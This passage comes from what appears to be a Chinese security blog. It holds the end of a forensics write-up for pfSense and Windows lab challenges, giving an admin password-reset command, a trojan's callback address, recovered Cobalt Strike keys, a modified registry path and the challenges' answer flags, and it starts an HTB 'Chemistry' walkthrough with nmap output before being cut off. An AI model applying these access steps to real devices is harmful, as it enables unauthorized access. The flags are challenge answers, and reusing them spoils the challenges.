æœ¨é©¬</p><p><img src="https://img.dkdun.cn/v1/2025/12/5be58b647ab46f99.png"></p><p>æ‰§è¡Œä¼šå¾—åˆ°ç»“æœï¼Œç”¨ find å‘½ä»¤æŸ¥æ‰¾ flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;fla*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/42ec91e9abda60e2.png"></p><p>æ‰¾åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>b030dacb6e82a5cca0b1e6d2c8779fa&#125;<br></code></pre></td></tr></table></figure><h2 id="pfsense3"><a href="#pfsense3" class="headerlink" title="pfsense3"></a>pfsense3</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>æœäº†ä¸€ä¸‹ pfSense çš„é»˜è®¤å¯†ç </p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure><p>ä¸è¡Œï¼Œç„¶åæ‰¾åˆ°äº†é‡ç½®å¯†ç æ–¹æ³•ï¼Œâ€œè¿è¡Œ<code>/etc/rc.initial.password</code>ä»¥é‡ç½®ä¸ºé»˜è®¤å¯†ç â€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;y&quot;</span> | /etc/rc.initial.password<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/43d8a64a9c4093fa.png"></p><p>ç™»å½•è¿›å»åæ‰¾åˆ° VPN ä¸­çš„ IPSec</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>pfsense<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f1a1977a7ea2dd36.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;bde<span class="hljs-number">4</span>b<span class="hljs-number">5e2</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">43</span><span class="hljs-keyword">c</span><span class="hljs-number">177895</span>f<span class="hljs-number">6</span>f<span class="hljs-number">5</span>d<span class="hljs-number">85</span>beb<span class="hljs-number">97</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>æŸ¥æ‰¾ <code>config.xml</code> é…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*config.xml&quot;</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>/cf/conf/config.xml</code> æ–‡ä»¶ä¸­æ‰¾åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/8c8151bbb2eaa897.png"></p><h1 id="WinCS"><a href="#WinCS" class="headerlink" title="WinCS"></a>WinCS</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.å—æ§æœºå™¨æœ¨é©¬çš„å›è¿çš„<span class="hljs-built_in">ip</span>åœ°å€å’Œç«¯å£æ˜¯ï¼Ÿï¼ˆflag&#123;<span class="hljs-built_in">ip</span>:ç«¯å£&#125;ï¼‰<br><span class="hljs-number">2</span>.åˆ†ææµé‡ä¿¡æ¯ï¼Œæ”»å‡»è€…å°è¯•ä¿®æ”¹çš„jhonè´¦æˆ·å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ<br><span class="hljs-number">3</span>.åˆ†ææµé‡å½“ä¸­ï¼Œæ”»å‡»è€…æŸ¥çœ‹çš„æ–‡ä»¶ä¸­flagå†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ<br><span class="hljs-number">4</span>.æ”»å‡»è€…åœ¨æ”»å‡»è¿‡ç¨‹å½“ä¸­ä¿®æ”¹è¿‡çš„æ³¨å†Œè¡¨ç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿ<br><span class="hljs-number">5</span>.å—æ§æœºå½“ä¸­åŠ å¯†æ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ<br><span class="hljs-number">6</span>.å—æ§æœºæœ¨é©¬çš„è‡ªå¯åŠ¨æ–‡ä»¶è·¯å¾„æ˜¯ä»€ä¹ˆï¼Ÿ<br></code></pre></td></tr></table></figure><h2 id="WinCS1"><a href="#WinCS1" class="headerlink" title="WinCS1"></a>WinCS1</h2><p>åœ¨ç«ç»’çš„ä¿¡ä»»é¡¹ä¸­æœ‰ä¸€ä¸ªå¯ä»¥ <code>.exe</code> æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/a40ffff95fae77bd.png"></p><p>æ‹¿å‡ºæ¥æ”¾å…¥å¾®æ­¥æ²™ç®±æŸ¥æ€ï¼Œåˆ¤å®šä¸ºæœ¨é©¬</p><p><img src="https://img.dkdun.cn/v1/2025/12/b390012a0800795b.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/a42499ac6767e53e.png"></p><p>æ‹¿åˆ°å›è¿ IPï¼š 61.139.2.139:80</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">61.139.2.139:80</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS2"><a href="#WinCS2" class="headerlink" title="WinCS2"></a>WinCS2</h2><p>jhon ç”¨æˆ·ç›®å½•ä¸‹æœ‰ä¸¤å¼ ä¸€æ ·çš„å›¾ç‰‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/e534d3fbfecad5da.png"></p><p>ç”¨ 010 æ‰“å¼€å‘ç°ä¸¤å¼ å›¾ç‰‡æœ€åéƒ½æœ‰å‹ç¼©åŒ…æ•°æ®ï¼Œå¹¶ä¸”èƒ½çœ‹è§ <code>.cobaltstrike.beacon_keys</code> å­—æ ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/77db36ec04799d87.png"></p><p>æ–°å»ºåå…­è¿›åˆ¶æ–‡ä»¶ï¼ŒæŠŠä¸¤å¼ å›¾ç‰‡ä¸­çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„æ–‡ä»¶ä¿å­˜å¾—åˆ°å‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ <code>.cobaltstrike.beacon_keys</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/46bd81ce2e2e4faf.png"></p><p>å¯¼å…¥ NatA åˆ†æå¾—åˆ° jhon ç”¨æˆ·å¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/80c55bba110881b5.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">flag&#123;<span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssW0rd</span><span class="hljs-keyword">@123</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS3"><a href="#WinCS3" class="headerlink" title="WinCS3"></a>WinCS3</h2><p>å¾€ä¸‹ç¿»æ‰¾åˆ°</p><p><img src="https://img.dkdun.cn/v1/2025/12/8833b2ee636d36bd.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">31975589</span>df49e6ce84853be7582549f4&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS4"><a href="#WinCS4" class="headerlink" title="WinCS4"></a>WinCS4</h2><p><img src="https://img.dkdun.cn/v1/2025/12/d0adeb57519e7386.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">HKEY_CURRENT_USER\Software\Classes\mscfile\<span class="hljs-built_in">shell</span>\<span class="hljs-built_in">open</span>\<span class="hljs-keyword">command</span><br></code></pre></td></tr></table></figure><p>md5 åŠ å¯†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">87</span>a76255029843238bf87091dd5a6c88&#125;<br></code></pre></td></tr></table></figure><h2 id="WinCS5"><a href="#WinCS5" class="headerlink" title="WinCS5"></a>WinCS5</h2><p>ä»ä¹‹å‰çš„åˆ†æä¸­è¿˜å‘ç° jhon ç”¨æˆ·ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª <code>passkey.txt</code>ï¼Œå¹¶ä¸”è¿˜æœ‰å¯†ç </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">PolarCTF@</span><span class="hljs-number">2025</span>Spring<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7c9eb10afeafad45.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;fc51bd0633d256f2dcbe282efa205c3a&#125;</span><br></code></pre></td></tr></table></figure><h2 id="WinCS6"><a href="#WinCS6" class="headerlink" title="WinCS6"></a>WinCS6</h2><p>åœ¨ <code>C:\Users\jhon\AppData\Local\Temp</code> ä¸‹å‘ç°æ‰¹å¤„ç†æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/9d16b9098fad2af6.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\jhon\AppData\Local\Temp\power.bat<br></code></pre></td></tr></table></figure><p>md5 åŠ å¯†</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;e991ef211ab8adc893dc874c4ae929b3&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Chemistry</title>
    <link href="/2025/03/22/HTB-Chemistry/"/>
    <url>/2025/03/22/HTB-Chemistry/</url>
    
    <content type="html"><![CDATA[<p>å¾ˆç®€å•çš„ä¸€ä¸ªé¶æœºï¼Œå’Œ <a href="https://buutt3rf1y.github.io/2025/02/14/Shop/#SSH">THM-Publisher</a> æœ‰ä¸€ç‚¹ç‚¹åƒ</p><span id="more"></span><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">â””â”€# nmap -sS -sV -Pn -A 10.10.11.38</span><br><span class="language-xml">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 19:06 CST</span><br><span class="language-xml">Nmap scan report for 10.10.11.38</span><br><span class="language-xml">Host is up (0.32s latency).</span><br><span class="language-xml">Not shown: 998 closed tcp ports (reset)</span><br><span class="language-xml">PORT     STATE SERVICE VERSION</span><br><span class="language-xml">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="language-xml">| ssh-hostkey:</span><br><span class="language-xml">|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)</span><br><span class="language-xml">|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)</span><br><span class="language-xml">|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)</span><br><span class="language-xml">5000/tcp open  upnp?</span><br><span class="language-xml">| fingerprint-strings:</span><br><span class="language-xml">|   GetRequest:</span><br><span class="language-xml">|     HTTP/1.1 200 OK</span><br><span class="language-xml">|     Server: Werkzeug/3.0.3 Python/3.9.5</span><br><span class="language-xml">|     Date: Sat, 22 Mar 2025 11:06:46 GMT</span><br><span class="language-xml">|     Content-Type: text/html; charset=utf-8</span><br><span class="language-xml">|     Content-Length: 719</span><br><span class="language-xml">|     Vary: Cookie</span><br><span class="language-xml">|     Connection: close</span><br><span class="language-xml">|     <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Chemistry - Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/styles.css&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span></span><br><span class="language-xml">|     class=&quot;title&quot;&gt;Chemistry CIF Analyzer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;buttons&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml">|     href=&quot;/register&quot; class=&quot;btn&quot;&gt;Register<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|   RTSPRequest:</span><br><span class="language-xml">|     <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Error response<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code: 400<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Message: Bad request version (&#x27;RTSP/1.0&#x27;).<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">|     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">|_    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="language-xml">SF-Port5000-TCP:V=7.94SVN%I=7%D=3/22%Time=67DE99C3%P=x86_64-pc-linux-gnu%r</span><br><span class="language-xml">SF:(GetRequest,38A,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\</span><br><span class="language-xml">SF:x20Python/3\.9\.5\r\nDate:\x20Sat,\x2022\x20Mar\x202025\x2011:06:46\x20</span><br><span class="language-xml">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\</span><br><span class="language-xml">SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<span class="hljs-meta">&lt;!DOCTYPE\x20h</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">SF</span>:tml&gt;</span>\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>\n\x20\x20\x20\x20&lt;meta\x20charset=\</span><br><span class="language-xml">SF:&quot;UTF-8\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;widt</span><br><span class="language-xml">SF:h=device-width,\x20initial-scale=1\.0\&quot;&gt;\n\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Chemis</span><br><span class="language-xml">SF:try\x20-\x20Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x</span><br><span class="language-xml">SF:20href=\&quot;/static/styles\.css\&quot;&gt;\n<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>\n\x20\x20\x20\x20\n\x2</span><br><span class="language-xml">SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20&lt;div\x20class=</span><br><span class="language-xml">SF:\&quot;container\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1\x20class=\&quot;title\&quot;&gt;</span><br><span class="language-xml">SF:Chemistry\x20CIF\x20Analyzer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>W</span><br><span class="language-xml">SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x</span><br><span class="language-xml">SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In</span><br><span class="language-xml">SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c</span><br><span class="language-xml">SF:ontained\x20within\.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;div\x20class</span><br><span class="language-xml">SF:=\&quot;buttons\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml">SF:&lt;a\x20href=\&quot;/login\&quot;\x20class=\&quot;btn\&quot;&gt;Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>\n\x20\x20\x20\x20\x20\</span><br><span class="language-xml">SF:x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&quot;/register\&quot;\x20class=\&quot;btn\&quot;&gt;Re</span><br><span class="language-xml">SF:gister<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n\x20\x20\x</span><br><span class="language-xml">SF:20\x20<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>\n&lt;&quot;)%r(RTSPRequest,1F4,&quot;<span class="hljs-meta">&lt;!DOCTYPE\x20HTML\x20PUBL</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">SF</span>:IC\x20\<span class="hljs-string">&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Cont</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:ent-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x2</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:0\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20r</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:esponse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20v</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:ersion\x20\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Err</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:quest\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">SF:/body&gt;\n&lt;/html&gt;\n&quot;</span>);</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">No</span> <span class="hljs-keyword">exact</span> <span class="hljs-keyword">OS</span> <span class="hljs-keyword">matches</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">host</span> (<span class="hljs-keyword">If</span> <span class="hljs-keyword">you</span> <span class="hljs-keyword">know</span> <span class="hljs-keyword">what</span> <span class="hljs-keyword">OS</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">it</span>, <span class="hljs-keyword">see</span> <span class="hljs-keyword">https</span>://<span class="hljs-keyword">nmap</span>.<span class="hljs-keyword">org</span>/<span class="hljs-keyword">submit</span>/ ).</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">TCP</span>/IP <span class="hljs-keyword">fingerprint</span>:</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:SCAN(V=7.94<span class="hljs-keyword">SVN</span>%E=4%D=3/22%<span class="hljs-keyword">OT</span>=22%<span class="hljs-keyword">CT</span>=1%<span class="hljs-keyword">CU</span>=37541%<span class="hljs-keyword">PV</span>=Y%<span class="hljs-keyword">DS</span>=3%<span class="hljs-keyword">DC</span>=T%G=Y%<span class="hljs-keyword">TM</span>=67<span class="hljs-keyword">DE</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:9<span class="hljs-keyword">A52</span>%P=<span class="hljs-keyword">x86_64-pc-linux-gnu</span>)SEQ(<span class="hljs-keyword">SP</span>=106%<span class="hljs-keyword">GCD</span>=1%<span class="hljs-keyword">ISR</span>=10D%<span class="hljs-keyword">TI</span>=Z%<span class="hljs-keyword">CI</span>=Z%<span 